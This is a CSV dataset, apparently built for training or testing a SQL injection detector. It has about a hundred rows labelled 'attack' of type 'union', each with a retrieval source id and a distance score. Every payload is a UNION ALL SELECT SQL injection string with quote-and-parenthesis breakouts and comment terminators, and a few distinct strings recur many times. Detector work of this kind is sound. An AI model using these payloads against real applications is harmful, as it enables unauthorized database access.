id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
GAN_000400,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.3605800931305083
GAN_000401,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000286,3.426309224277757
GAN_000402,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000054,3.6819835938979293
GAN_000403,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000286,3.5182114542585157
GAN_000404,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.351517997695347
GAN_000405,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.439226103747187
GAN_000406,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000222,3.6605594595029594
GAN_000407,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000054,3.487561105960017
GAN_000408,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.4171040182378696
GAN_000409,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.5985337763055534
GAN_000410,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.7675784254869886
GAN_000411,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000302,3.539161909018856
GAN_000412,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.872162081667105
GAN_000413,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.347473163533638
GAN_000414,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000286,3.617865055802762
GAN_000415,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.5038240364597253
GAN_000416,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.3786052606857173
GAN_000417,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.5633780409126543
GAN_000418,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000286,3.4811798124774453
GAN_000419,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000054,3.4338606432097825
GAN_000420,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000286,3.5804697651767756
GAN_000421,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.4352162450319716
GAN_000422,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.649464838395878
GAN_000423,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.312205014770692
GAN_000424,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.61815053798384
GAN_000425,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.398297594937246
GAN_000426,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.4022836117032287
GAN_000427,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.4795867432679937
GAN_000428,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000200,3.5063497659653744
GAN_000429,attack,union,"-6593""  )   union all select 6216,6216,6216,6216,6216,6216,6216#",nearest_attack_euclidean,R000105,4.003232946870838
GAN_000430,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.5050821668574503
GAN_000431,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000054,3.503879304340159
GAN_000432,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000286,3.4705099288121906
GAN_000433,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000054,3.447221450255877
GAN_000434,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.543777529730893
GAN_000435,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.487389793239156
GAN_000436,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000302,3.4397323836969873
GAN_000437,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000286,3.57765140937229
GAN_000438,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000054,3.4472320468969104
GAN_000439,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,4.077891361655186
GAN_000440,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000054,3.505285846168978
GAN_000441,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000200,3.4457208808786164
GAN_000442,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.4222000702137088
GAN_000443,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000200,3.6263863678660933
GAN_000444,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000302,3.546481025248832
GAN_000445,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.4606503281557943
GAN_000446,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000286,3.424398651772565
GAN_000447,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.581480053433885
GAN_000448,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000200,3.6051218450825653
GAN_000449,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000200,3.558995486990998
GAN_000450,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.6852789330111166
GAN_000451,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.5031040647487615
GAN_000452,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.5514824931601456
GAN_000453,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000200,3.934430996778161
GAN_000454,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.4139047424546094
GAN_000455,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000286,3.8978842898329438
GAN_000456,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000286,3.5099999555463732
GAN_000457,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000286,3.3668781960495906
GAN_000458,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000054,3.5895647835123485
GAN_000459,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000302,3.4804112728850183
GAN_000460,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000200,3.624946469540182
GAN_000461,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.380869243451767
GAN_000462,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.515950604231549
GAN_000463,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.6566437113609354
GAN_000464,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000054,3.4662316927554495
GAN_000465,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000286,3.427701898223712
GAN_000466,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.628113754986697
GAN_000467,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.55751355701167
GAN_000468,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.4034049397322286
GAN_000469,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.523442517495631
GAN_000470,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000286,3.562524707596817
GAN_000471,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.7134237174140523
GAN_000472,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.3974170731062867
GAN_000473,attack,union,"-1187'  )   union all select 8202,8202,8202,8202,8202,8202,8202#",nearest_attack_euclidean,R000173,3.4670983115804694
GAN_000474,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000302,3.3354312156341885
GAN_000475,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000286,3.5621606470806695
GAN_000476,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.5567144866210807
GAN_000477,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.499917622720106
GAN_000478,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000286,3.527600742927709
GAN_000479,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.3792475375506137
GAN_000480,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.482323494993386
GAN_000481,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.6582888183461426
GAN_000482,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000302,3.366932297492595
GAN_000483,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000054,3.373143624553936
GAN_000484,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000286,3.470961820955264
GAN_000485,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000200,3.587974246360691
GAN_000486,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.3673994129621665
GAN_000487,attack,union,"-1187'  )   union all select 8202,8202,8202,8202,8202,8202,8202#",nearest_attack_euclidean,R000173,3.7450545673287388
GAN_000488,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.5338985326917696
GAN_000489,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.285646742921959
GAN_000490,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000200,3.8311582711787553
GAN_000491,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000286,3.6378404311487795
GAN_000492,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.5046336318189915
GAN_000493,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000302,3.4619462100530716
GAN_000494,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000054,3.458987786996823
GAN_000495,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.414118391291848
GAN_000496,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000200,3.663727600131135
GAN_000497,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.4545607573784305
GAN_000498,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,3.5978061666985357
GAN_000499,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000054,3.394122466598817
GAN_000500,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000200,3.4498559763625187
